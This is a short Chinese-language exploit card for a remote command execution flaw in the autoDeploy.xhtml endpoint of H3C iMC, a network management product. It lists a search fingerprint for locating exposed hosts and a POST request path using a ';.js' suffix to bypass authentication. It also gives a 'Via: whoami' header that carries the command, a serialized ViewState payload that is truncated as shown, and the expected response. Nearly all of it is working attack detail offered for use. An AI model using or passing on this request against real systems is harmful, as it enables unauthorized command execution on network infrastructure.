# H3CiMC智能管理中心autoDeploy.xhtml远程代码执行漏洞

- **系统**：H3CiMC　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="用户自助服务"`
- **请求**：`POST /imc/autoDeploy.xhtml;.js HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Via: whoami`

**请求体 / payload**
```
javax.faces.ViewState=8SzWaaoxnkq9php028NtXbT98DEcA...Uh57HB/L8xz6eq%2b4sy0rUOuOdM5ccd2J6LPx8c6%2b53QkrX...jpFKgVnp07bad4n6CCBW8l98QIKwByAhLYdU2VpB/voaa....2oU%2burahQDFE8mIaFvmwyKOHiwyovIHCVymqKwNdWXm3iHLhYEQXL4....k3z7MWm%2bwbV2Dc9TXV4rs8E6M7ZvVM3B0pORK8vAhd2iLBkgFhGHw9ZgOwifGnyMzfxlU....gG4chEOg57teuLurMPrulbEVBAEl7rRwobqvxb91sG%2bGMrGWFL5%2bwFvE56x7UEzHtE/o0IRtzTKi/EFnamrPT1046e7L8jABKDB/LjCX2qAOmqQkIz4gXrEFnHHYZ9LZc7t9ZZPNT...JZjummuZuror/zwPbnsApwXlYsn2hDAZ7QlOBunA3t7omeOTI5keWXvmOH8eoEEN//SlmQblwhBZ7kSHPvStq0ZciiPptEzVjQ/k/gU2QbCSc7yG0MFbhcJEDQj4yKyJ/yTnOOma....KuNzZl%2bPpEua%2b28h2YCKi…（脚本共 2186 字，完整版见原文）
```
- **预期**：200　|　—